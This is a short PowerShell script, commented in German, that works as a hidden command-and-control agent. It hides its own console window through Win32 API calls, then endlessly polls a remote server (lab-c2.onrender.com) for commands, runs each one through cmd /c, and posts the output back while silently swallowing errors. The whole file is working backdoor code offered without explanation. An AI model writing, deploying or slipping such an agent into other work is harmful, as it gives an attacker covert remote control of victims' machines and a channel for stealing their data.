# Fenster sofort verstecken via Win32 API
Add-Type -Name W -Namespace C -MemberDefinition '
[DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr h, int n);
'
[C.W]::ShowWindow([C.W]::GetConsoleWindow(), 0) | Out-Null

$c2 = 'https://lab-c2.onrender.com'
while($true) {
    try {
        $r = (Invoke-WebRequest -Uri "$c2/getcmd" -UseBasicParsing).Content | ConvertFrom-Json
        if ($r.cmd) {
            $o = (cmd /c $r.cmd 2>&1) | Out-String
            Invoke-WebRequest -Uri "$c2/result" -Method POST -Body (ConvertTo-Json @{output=$o}) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
    } catch {}
    Start-Sleep -Seconds 3
}
